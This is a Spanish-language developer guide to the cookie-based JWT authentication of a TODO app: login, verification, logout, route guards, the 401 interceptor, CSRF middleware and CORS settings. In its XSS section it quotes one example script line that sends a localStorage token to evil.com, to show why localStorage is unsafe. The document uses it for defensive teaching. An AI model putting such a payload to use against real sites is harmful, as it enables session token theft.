# Flujo de Autenticación con Cookies HttpOnly

Este documento explica cómo funciona el sistema de autenticación en la aplicación TODO usando cookies HttpOnly.

## Tabla de Contenidos

1. [Arquitectura General](#arquitectura-general)
2. [Flujo de Login/Register](#flujo-de-loginregister)
3. [Flujo de Verificación de Autenticación](#flujo-de-verificación-de-autenticación)
4. [Flujo de Logout](#flujo-de-logout)
5. [Protección de Rutas](#protección-de-rutas)
6. [Manejo de Errores 401](#manejo-de-errores-401)
7. [Seguridad](#seguridad)

---

## Arquitectura General

### Backend

- **Framework**: Express.js
- **Cookies**: Usa `cookie-parser` middleware
- **JWT**: Tokens guardados en cookies HttpOnly
- **CORS**: Configurado con `credentials: true`

### Frontend

- **HTTP Client**: Axios con `withCredentials: true`
- **State Management**: React Query
- **Auth Hook**: `useAuth()` custom hook
- **NO usa localStorage**: Todo se maneja con cookies

---

## Flujo de Login/Register

### 1. Usuario envía credenciales

```javascript
// Frontend: Login.jsx o Register.jsx
const { login } = useAuth();
await login({ email, password });
```

### 2. Frontend hace petición al backend

```javascript
// Frontend: auth.api.js
authApi.login({ email, password })
  → POST /api/auth/login
  → axios automáticamente incluye cookies (withCredentials: true)
```

### 3. Backend valida y genera token

```javascript
// Backend: auth.controller.js
export const login = async (req, res) => {
  // Valida credenciales
  const user = await User.findOne({ email });
  const isValid = await user.comparePassword(password);

  // Genera token y lo envía en cookie
  sendTokenResponse(user, 200, res);
};
```

### 4. Backend envía cookie con el token

```javascript
// Backend: jwt.js
export const sendTokenResponse = (user, statusCode, res) => {
  const token = generateToken(user._id);

  // Configura la cookie
  const cookieOptions = {
    expires: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000), // 7 días
    httpOnly: true, // No accesible por JavaScript
    secure: NODE_ENV === "production", // Solo HTTPS en producción
    sameSite: NODE_ENV === "production" ? "none" : "strict", // Cross-domain en prod
  };

  // Envía cookie + datos del usuario
  res.cookie("token", token, cookieOptions).json({
    status: "success",
    data: { user },
  });
};
```

**Configuración de sameSite:**
- **Desarrollo**: `sameSite: 'strict'` (máxima protección, mismo dominio)
- **Producción**: `sameSite: 'none'` (permite cross-domain: Vercel ↔ Render)
  - Requiere `secure: true` (solo HTTPS)
  - Se complementa con middleware CSRF para seguridad

### 5. Frontend recibe respuesta

```javascript
// Frontend: useAuth.js
const loginMutation = useMutation({
  mutationFn: authApi.login,
  onSuccess: (response) => {
    queryClient.setQueryData(["auth", "me"], response.data.user);
  },
});
```

### 6. Navegador guarda la cookie automáticamente

El navegador guarda la cookie `token` con las siguientes características:

- **HttpOnly**: JavaScript no puede leerla
- **Secure**: Solo se envía por HTTPS (en producción)
- **SameSite**:
  - Desarrollo: `'strict'` - Solo se envía a tu dominio
  - Producción: `'none'` - Permite cross-domain con CSRF protection
- **Expires**: Se elimina después de 7 días

---

## Flujo de Verificación de Autenticación

Este flujo ocurre cada vez que se carga la aplicación o un componente usa `useAuth()`.

### 1. Componente usa useAuth()

```javascript
// Cualquier componente
const { user, isAuthenticated, loading } = useAuth();
```

### 2. useAuth ejecuta query automática

```javascript
// Frontend: useAuth.js
useQuery({
  queryKey: ["auth", "me"],
  queryFn: async () => {
    const response = await authApi.getMe();
    return response.data.user;
  },
  staleTime: 5 * 60 * 1000, // Cache por 5 minutos
});
```

### 3. Frontend hace petición con cookie automática

```javascript
// La petición incluye automáticamente la cookie
GET /api/auth/me
Headers:
  Cookie: token=eyJhbGciOiJIUzI1NiIs...
```

### 4. Backend verifica token desde cookie

```javascript
// Backend: auth.js middleware
export const protect = async (req, res, next) => {
  let token;

  // 1. Intenta obtener token de la cookie (PRIMERA OPCIÓN)
  if (req.cookies.token) {
    token = req.cookies.token;
  }
  // 2. Si no hay cookie, intenta Authorization header (fallback)
  else if (req.headers.authorization?.startsWith("Bearer")) {
    token = req.headers.authorization.split(" ")[1];
  }

  if (!token) {
    throw new AppError("No token provided", 401);
  }

  // Verifica el token
  const decoded = jwt.verify(token, process.env.JWT_SECRET);

  // Busca el usuario
  const user = await User.findById(decoded.id);

  // Adjunta usuario al request
  req.user = user;
  next();
};
```

### 5. Backend retorna datos del usuario

```javascript
// Backend: auth.controller.js
export const getMe = async (req, res) => {
  // req.user ya fue seteado por el middleware protect
  const user = await User.findById(req.user._id);

  res.json({
    status: "success",
    data: { user },
  });
};
```

### 6. Frontend actualiza estado

```javascript
// useAuth retorna el usuario
// React Query cachea el resultado
// Los componentes pueden acceder a { user, isAuthenticated }
```

---

## Flujo de Logout

### 1. Usuario hace logout

```javascript
const { logout } = useAuth();
await logout();
```

### 2. Frontend hace petición al backend

```javascript
POST / api / auth / logout;
// Cookie se envía automáticamente
```

### 3. Backend invalida la cookie

```javascript
// Backend: auth.controller.js
export const logout = async (req, res) => {
  // Sobrescribe la cookie con un valor inválido y expiración corta
  res.cookie("token", "none", {
    expires: new Date(Date.now() + 10 * 1000), // Expira en 10 segundos
    httpOnly: true,
  });

  res.json({
    status: "success",
    message: "Logged out successfully",
  });
};
```

### 4. Frontend limpia estado

```javascript
// Frontend: useAuth.js
const logoutMutation = useMutation({
  mutationFn: authApi.logout,
  onSuccess: () => {
    // Limpia React Query
    queryClient.setQueryData(["auth", "me"], null);
    queryClient.clear();

    // Redirige a login
    navigate("/login");
  },
});
```

---

## Protección de Rutas

### Rutas Protegidas (requieren autenticación)

```javascript
// ProtectedRoute.jsx
export const ProtectedRoute = ({ children }) => {
  const { isAuthenticated, loading } = useAuth();

  if (loading) return <Loader />;

  // Si no está autenticado, redirige a login
  if (!isAuthenticated) return <Navigate to="/login" />;

  return children;
};
```

Uso:

```javascript
<Route
  path="/dashboard"
  element={
    <ProtectedRoute>
      <Dashboard />
    </ProtectedRoute>
  }
/>
```

### Rutas Públicas (solo para NO autenticados)

```javascript
// PublicRoute.jsx
export const PublicRoute = ({ children }) => {
  const { isAuthenticated, loading } = useAuth();

  if (loading) return <Loader />;

  // Si ya está autenticado, redirige a dashboard
  if (isAuthenticated) return <Navigate to="/dashboard" />;

  return children;
};
```

Uso:

```javascript
<Route
  path="/login"
  element={
    <PublicRoute>
      <Login />
    </PublicRoute>
  }
/>
```

---

## Manejo de Errores 401

El interceptor de axios maneja automáticamente los errores de autenticación:

```javascript
// Frontend: axios.js

const shouldRedirectToLogin = (error) => {
  // 1. Solo procesamos errores 401 (no autorizado)
  if (error.response?.status !== 401) return false;

  // 2. No redirigir si ya estamos en una ruta pública
  const currentPath = window.location.pathname;
  if (
    currentPath === "/login" ||
    currentPath === "/register" ||
    currentPath === "/"
  ) {
    return false;
  }

  // 3. No redirigir si es una petición de autenticación (es normal que falle)
  const failedUrl = error.config?.url || "";
  if (failedUrl.includes("/auth/")) {
    return false;
  }

  // 4. En cualquier otro caso, sí redirigir
  return true;
};

axiosInstance.interceptors.response.use(
  (response) => response,
  (error) => {
    if (shouldRedirectToLogin(error)) {
      window.location.href = "/login";
    }
    return Promise.reject(error);
  }
);
```

### Casos de uso:

| Situación                           | Ruta Actual  | Petición                | Acción                       |
| ----------------------------------- | ------------ | ----------------------- | ---------------------------- |
| Token expirado mientras usas la app | `/dashboard` | `GET /api/tasks` → 401  | ✅ Redirige a `/login`       |
| Usuario no autenticado visita login | `/login`     | `GET /auth/me` → 401    | ❌ No redirige (evita bucle) |
| Error de validación                 | `/dashboard` | `POST /api/tasks` → 400 | ❌ No redirige (no es 401)   |
| Usuario sin cookie accede           | `/dashboard` | `GET /api/tasks` → 401  | ✅ Redirige a `/login`       |

---

## Seguridad

### Protección CSRF en Producción

Dado que en producción usamos `sameSite: 'none'` para permitir cookies cross-domain (frontend en Vercel, backend en Render), implementamos un middleware CSRF adicional:

```javascript
// Backend: csrfProtection.js
export const csrfProtection = (req, res, next) => {
  // Solo bloquea peticiones mutantes (POST, PUT, PATCH, DELETE)
  const safeMethods = ['GET', 'HEAD', 'OPTIONS'];
  if (safeMethods.includes(req.method)) {
    return next();
  }

  const origin = req.get('origin');
  const referer = req.get('referer');
  const allowedOrigins = [
    process.env.CORS_ORIGIN,
    process.env.FRONTEND_URL,
  ].filter(Boolean);

  // 1. Verificar Origin (preferido)
  if (origin) {
    if (!allowedOrigins.includes(origin)) {
      return res.status(403).json({
        status: 'error',
        message: 'Forbidden - Invalid origin'
      });
    }
    return next();
  }

  // 2. Verificar Referer (como backup)
  if (!origin && referer) {
    const refererDomain = new URL(referer).origin;
    if (!allowedOrigins.includes(refererDomain)) {
      return res.status(403).json({
        status: 'error',
        message: 'Forbidden - Invalid referer'
      });
    }
    return next();
  }

  // 3. Sin origin ni referer = bloquear
  return res.status(403).json({
    status: 'error',
    message: 'Forbidden - Missing origin/referer'
  });
};
```

**¿Qué es Origin y Referer?**

- **Origin**: Header HTTP que indica el dominio de donde proviene la petición
  - Ejemplo: `Origin: https://tu-app.vercel.app`
  - Más confiable, enviado automáticamente por el navegador

- **Referer**: Header HTTP que indica la URL completa desde donde vienes
  - Ejemplo: `Referer: https://tu-app.vercel.app/dashboard`
  - Backup cuando Origin no está disponible (algunos navegadores)

**El navegador envía estos headers automáticamente**, un atacante no puede falsificarlos desde su sitio web malicioso.

**Activación del middleware:**
```javascript
// server.js - Solo activo en producción
if (process.env.NODE_ENV === 'production') {
  app.use(csrfProtection);
}
```

### Ventajas de usar Cookies HttpOnly

#### ✅ Protección contra XSS (Cross-Site Scripting)

```javascript
// ❌ Con localStorage (vulnerable)
const token = localStorage.getItem("token");
// Si hay XSS, un script malicioso puede robar el token:
// <script>fetch('https://evil.com?token=' + localStorage.getItem('token'))</script>

// ✅ Con cookies HttpOnly (seguro)
// JavaScript NO puede acceder a la cookie
console.log(document.cookie); // No muestra la cookie 'token'
```

#### ✅ Protección contra CSRF (Cross-Site Request Forgery)

```javascript
// En desarrollo: sameSite: 'strict' (máxima protección)
// En producción: sameSite: 'none' + middleware CSRF
cookieOptions = {
  sameSite: NODE_ENV === 'production' ? 'none' : 'strict',
  secure: NODE_ENV === 'production', // 'none' requiere HTTPS
};
```

**¿Por qué sameSite: 'none' en producción?**
- Frontend (Vercel) y backend (Render) están en **diferentes dominios**
- `sameSite: 'strict'` bloquea cookies cross-domain
- `sameSite: 'none'` permite que Vercel envíe cookies a Render
- **Mitigamos el riesgo** con middleware CSRF que verifica Origin/Referer

**¿Por qué sameSite: 'strict' funciona en desarrollo?**

Diferencia entre **Origin** y **Site**:
- **Origin** = protocolo + dominio + puerto
  - `http://localhost:3000` ≠ `http://localhost:5000` (diferentes origins)
- **Site** = dominio registrable sin considerar el puerto
  - `localhost:3000` y `localhost:5000` = mismo site (`localhost`)

En desarrollo:
```
Frontend: localhost:3000 →  Backend: localhost:5000
✅ Mismo SITE (localhost) → sameSite: 'strict' funciona
❌ Diferentes ORIGINS → CORS necesario
```

En producción:
```
Frontend: vercel.app  →  Backend: onrender.com
❌ Diferentes SITES → sameSite: 'strict' NO funciona
→ Usamos sameSite: 'none' + CSRF protection
```

#### ✅ Transmisión segura

```javascript
// En producción, solo se envía por HTTPS
cookieOptions = {
  secure: process.env.NODE_ENV === "production", // Solo HTTPS
};
```

### Configuración CORS crítica

**Backend:**

```javascript
// server.js
app.use(
  cors({
    origin: process.env.CORS_ORIGIN || "http://localhost:3000",
    credentials: true, // CRÍTICO: permite enviar cookies
  })
);
```

**Frontend:**

```javascript
// axios.js
const axiosInstance = axios.create({
  withCredentials: true, // CRÍTICO: incluye cookies en las peticiones
});
```

**Ambos `credentials: true` son NECESARIOS para que las cookies funcionen.**

---

## Diagrama de Flujo Completo

```
┌─────────────────────────────────────────────────────────────┐
│                    FLUJO DE AUTENTICACIÓN                    │
└─────────────────────────────────────────────────────────────┘

LOGIN/REGISTER:
┌──────────┐   POST /auth/login    ┌──────────┐
│          │ ──────────────────────>│          │
│ Frontend │   { email, password }  │ Backend  │
│          │                        │          │
│          │<─────────────────────  │          │
└──────────┘   Set-Cookie: token    └──────────┘
     │            + user data             │
     │                                    │
     v                                    v
  Guarda user                       Genera token
  en React Query                    Envía cookie
  (NO en localStorage)              HttpOnly + Secure


PETICIONES PROTEGIDAS:
┌──────────┐   GET /api/tasks       ┌──────────┐
│          │ ──────────────────────>│          │
│ Frontend │   Cookie: token        │ Backend  │
│          │   (automático)         │          │
│          │                        │          │
│          │<─────────────────────  │          │
└──────────┘   { tasks: [...] }     └──────────┘
                                         │
                                         v
                                    Middleware protect
                                    Verifica token
                                    Adjunta user a req


ERROR 401 (Token inválido/expirado):
┌──────────┐   GET /api/tasks       ┌──────────┐
│          │ ──────────────────────>│          │
│ Frontend │   Cookie: expired      │ Backend  │
│          │                        │          │
│          │<─────────────────────  │          │
└──────────┘   401 Unauthorized     └──────────┘
     │
     v
Interceptor detecta 401
     │
     v
¿Es endpoint /auth/*? ──YES──> No redirige
     │
    NO
     │
     v
¿Ya estamos en /login? ──YES──> No redirige
     │
    NO
     │
     v
Redirige a /login
```

---

## Checklist de Implementación

### Backend ✅

- [x] Instalar `cookie-parser`
- [x] Configurar CORS con `credentials: true`
- [x] Middleware `protect` lee token desde `req.cookies.token`
- [x] Enviar token en cookie con `httpOnly`, `secure`, `sameSite`
- [x] Logout invalida la cookie

### Frontend ✅

- [x] Axios configurado con `withCredentials: true`
- [x] NO usar `localStorage` para el token
- [x] Hook `useAuth()` no lee localStorage
- [x] Interceptor maneja errores 401 correctamente
- [x] Evitar bucles de redirección en rutas públicas

---

## Variables de Entorno

### Backend (.env)

```env
# JWT
JWT_SECRET=tu_secret_super_seguro_aqui
JWT_EXPIRES_IN=7d
JWT_COOKIE_EXPIRES_IN=7

# CORS
CORS_ORIGIN=http://localhost:3000

# Environment
NODE_ENV=development
```

### Frontend (.env)

```env
VITE_API_URL=http://localhost:5000/api
```

---

## Troubleshooting

### "Las cookies no se están enviando"

1. Verifica `withCredentials: true` en axios
2. Verifica `credentials: true` en CORS del backend
3. Verifica que el dominio y puerto coincidan
4. En producción, verifica que uses HTTPS

### "Bucle infinito en /login"

1. Verifica que el interceptor excluya rutas `/auth/*`
2. Verifica que el interceptor no redirija si ya estás en `/login`
3. Verifica que `useAuth` maneje errores correctamente

### "Token expirado pero no redirige"

1. Verifica que el interceptor maneje errores 401
2. Verifica que el backend devuelva 401 (no 403 u otro código)

---

## Recursos Adicionales

- [MDN: HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [OWASP: Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [Axios: withCredentials](https://axios-http.com/docs/req_config)
